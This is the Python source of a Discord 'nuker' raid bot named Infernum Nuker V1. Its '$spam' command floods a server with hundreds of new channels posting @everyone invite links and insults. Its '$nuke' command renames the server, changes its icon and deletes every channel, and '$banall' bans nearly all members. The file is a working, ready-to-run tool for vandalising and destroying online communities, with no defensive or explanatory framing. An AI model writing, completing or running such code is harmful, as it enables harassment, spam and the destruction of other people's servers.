import discord
from discord.ext import commands
import asyncio
import random, discord, threading, os, datetime, asyncio
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from colorama import Fore, Back, Style
from discord.ext import commands, tasks
import aiohttp
from colorama import Fore, Back, Style, init

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='$', intents=intents)

init(autoreset=True)

ascii_art = Fore.MAGENTA + r"""
$$$$$$\            $$$$$$\                                                             $$\   $$\           $$\                           
\_$$  _|          $$  __$$\                                                            $$$\  $$ |          $$ |                          
  $$ |  $$$$$$$\  $$ /  \__|$$$$$$\   $$$$$$\  $$$$$$$\  $$\   $$\ $$$$$$\$$$$\        $$$$\ $$ |$$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
  $$ |  $$  __$$\ $$$$\    $$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$  _$$  _$$\       $$ $$\$$ |$$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
  $$ |  $$ |  $$ |$$  _|   $$$$$$$$ |$$ |  \__|$$ |  $$ |$$ |  $$ |$$ / $$ / $$ |      $$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
  $$ |  $$ |  $$ |$$ |     $$   ____|$$ |      $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |      $$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
$$$$$$\ $$ |  $$ |$$ |     \$$$$$$$\ $$ |      $$ |  $$ |\$$$$$$  |$$ | $$ | $$ |      $$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
\______|\__|  \__|\__|      \_______|\__|      \__|  \__| \______/ \__| \__| \__|      \__|  \__| \______/ \__|  \__| \_______|\__|      
                                                                                                                                                                    
:: Infernum commands ::
*nuke     - Nuke server
*banall   - Bans all members
*spam     - Spams channels

Infernum Nuker V1
By - ils
"""

print(ascii_art)

@bot.command()
async def spam(ctx):
    new_message = (
        "||@everyone @here|| `Join ifs:` https://discord.gg/z5FwK5tUD9\n"
        "https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif\n"
        "F = Anormal de mierda, infernum on top! \n"
    )

    async def create_channel(name, message_count):
        for _ in range(20):
            try:
                new_channel = await ctx.guild.create_text_channel(name)
                tasks = [new_channel.send(new_message) for _ in range(message_count)]
                await asyncio.gather(*tasks)
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"")
                await asyncio.sleep(0.1)

    tasks = [create_channel("Raid-by-infernum", 20) for _ in range(60)]
    await asyncio.gather(*tasks)

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild
    if guild is None:
        return

    image_url = "https://media.discordapp.net/attachments/1393995441783177337/1393995700986970317/bebe.png?ex=6875332a&is=6873e1aa&hm=c164da7d5b88176d8ede868e16941641272f4c53ff6bbce48626fc1c4be83eee&=&format=webp&quality=lossless&width=652&height=662"  

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    await guild.edit(name="Pwned-by-Infernum", icon=icon_bytes)
    except:
        pass

    try:
        await asyncio.gather(*(channel.delete() for channel in guild.channels if channel is not None))
    except:
        pass

    try:
        await guild.create_text_channel("Raid-By-Infernum")
    except:
        pass
    
@bot.command()
@commands.has_permissions(administrator=True)
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member == ctx.author or member == ctx.guild.owner or member.bot:
            continue  
        try:
            await member.ban(reason="Infernum-On-Top")
        except:
            pass

bot.run("Your bot token here")
